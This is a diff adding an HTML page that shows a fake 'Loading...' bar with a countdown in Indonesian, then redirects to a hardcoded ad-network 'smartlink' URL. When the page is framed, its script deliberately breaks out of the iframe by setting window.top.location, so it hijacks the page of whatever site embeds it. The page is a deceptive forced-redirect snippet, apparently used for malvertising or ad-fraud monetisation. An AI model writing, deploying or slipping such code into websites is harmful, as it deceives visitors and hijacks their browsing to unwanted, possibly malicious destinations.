@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body { 
+            margin: 0; 
+            padding: 0;
+            background: transparent;
+            font-family: Arial, sans-serif;
+        }
+        .iframe-container {
+            width: 100%;
+            min-height: 100px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .loading-bar {
+            width: 80%;
+            height: 4px;
+            background: #f0f0f0;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        .loading-progress {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #3498db, #9b59b6);
+            transition: width 1s ease;
+        }
+        .counter {
+            text-align: center;
+            margin-top: 10px;
+            color: #666;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="iframe-container">
+        <div style="width: 100%; padding: 10px;">
+            <div class="loading-bar">
+                <div class="loading-progress" id="progress"></div>
+            </div>
+            <div class="counter" id="counter">Memuat dalam 3 detik...</div>
+        </div>
+    </div>
+
+    <script>
+        // =============== KONFIGURASI ===============
+        const SMARTLINK_URL = "https://oversightexcitement.com/ecpp2d2yf?key=780644cc073355ffdcb57a8c6dbbd9b4"; // GANTI DENGAN URL ANDA
+        // ===========================================
+
+        // Fungsi untuk redirect parent window (jika dalam iframe)
+        function redirectTop(url) {
+            try {
+                if (window.top !== window.self) {
+                    // Kita berada dalam iframe, coba redirect parent
+                    window.top.location.href = url;
+                } else {
+                    // Tidak dalam iframe, redirect biasa
+                    window.location.href = url;
+                }
+            } catch (e) {
+                // Jika gagal karena cross-origin, fallback ke redirect sendiri
+                window.location.href = url;
+            }
+        }
+
+        // Progress bar dan countdown
+        let timeLeft = 3;
+        const progressEl = document.getElementById('progress');
+        const counterEl = document.getElementById('counter');
+        
+        const interval = setInterval(() => {
+            timeLeft--;
+            const percentage = ((3 - timeLeft) / 3) * 100;
+            progressEl.style.width = percentage + '%';
+            
+            if (timeLeft > 0) {
+                counterEl.textContent = `Memuat dalam ${timeLeft} detik...`;
+            } else {
+                clearInterval(interval);
+                counterEl.textContent = 'Mengalihkan...';
+                
+                // Redirect ke smartlink
+                setTimeout(() => {
+                    const finalUrl = SMARTLINK_URL.includes('?') 
+                        ? SMARTLINK_URL + '&iframe_loader=true&ts=' + Date.now()
+                        : SMARTLINK_URL + '?iframe_loader=true&ts=' + Date.now();
+                    
+                    redirectTop(finalUrl);
+                }, 500);
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
